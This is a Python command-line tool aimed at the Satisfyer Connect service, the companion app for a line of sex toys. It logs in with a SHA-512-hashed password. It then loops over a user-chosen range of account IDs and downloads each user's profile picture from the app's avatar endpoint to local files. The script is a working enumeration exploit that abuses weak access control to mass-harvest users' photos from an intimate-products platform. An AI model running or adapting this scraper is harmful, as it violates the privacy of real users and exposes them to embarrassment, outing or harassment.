import requests, hashlib, sys, os, json

class Session:
    x_auth_token = None
    has_auth_token = 0

session = Session

def create_dir_if_not_exists():
    if not os.path.exists("./satisfyer/profile_photos"):
        os.makedirs("./satisfyer/profile_photos")

def show_help():
    print("Available commands: ")
    print(" -> login  | generates X-Auth-Token, necesary for the whole tool to work.")
    print(" -> getpfp | downloads profile pictures from x to y users.")
    print(" -> help   | shows this help menu")
    print(" -> exit   | returns to your system")

def str_to_sha512(string: str) -> str:
    # Encode the string to bytes
    string_bytes = string.encode()
    # Create a SHA512 hash object
    hash_object = hashlib.sha512()
    # Update the hash object with the string bytes
    hash_object.update(string_bytes)
    # Get the encrypted string as a hexadecimal string
    encrypted_string = hash_object.hexdigest()
    return encrypted_string

def login():
    user = input("User: ")
    plain_pwd = input("Pass: ")
    pwd = str_to_sha512(plain_pwd)
    
    headers = {
    "Host": "connect.satisfyer.com",
    "Accept": "application/json",
    "Lang": "es",
    "Content-Type": "application/json; charset=UTF-8",
    "Accept-Encoding": "gzip, deflate",
    "User-Agent": "okhttp/4.7.2",
    }

    payload = {
        "login": user,
        "password": pwd
    }

    url = "https://connect.satisfyer.com/auth/authenticate"

    response = requests.post(url, headers=headers, json=payload)
    response_json =  json.loads(response.text)
    if response.status_code != 200:
        print("[!] There was an error logging in: {}".format(response.status_code))
        print("{}".format(response.text))
    elif response.status_code == 200:
        try:
            session.x_auth_token = response_json["token"]
            session.has_auth_token = 1
            print("[i] Login successful!")
        except KeyError:
            print("[!] ERROR: X-Auth-Token header not found in response. Login failed.")
            print(response.text)
    

def get_pfp():
    
    if session.has_auth_token == 1:

        start = int(input("Get pfps from ID: "))
        end = int(input("Get pfps untill ID: "))    
        headers = {
            "Host": "connect.satisfyer.com",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT-I9505 Build/OPM2.171019.029)", # in this case we emulate an older Samsung Galaxy S4 with LineageOS I used for testing :)
            "X-Auth-Token": session.x_auth_token,
            "Accept-Encoding": "gzip, deflate",
        }

        url = "https://connect.satisfyer.com/external/avatar/{}?0"

        for i in range(start, end):
            url = "https://connect.satisfyer.com/external/avatar/{}?0".format(i)
            print("Trying profile ID {}".format(i))
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                with open("./satisfyer/image_{}.jpg".format(i), "wb") as f:
                    f.write(response.content)
            else:
                print("Failed to download image:", response.status_code)
    elif session.has_auth_token == 0:
        print("[!] ERROR: user must be logged in to access this functionality. Use the 'login' command to do so.")
    else:
        print("[!] ERROR: bad has_auth_token flag value.")

def prompt():
    while(True):
        op = input("]> ")
        if op == "login":
            login()
        elif op == "getpfp":
            get_pfp()
        elif op == "help":
            show_help()
        elif op == "exit":
            sys.exit()

if __name__ == "__main__":
    create_dir_if_not_exists()
    prompt()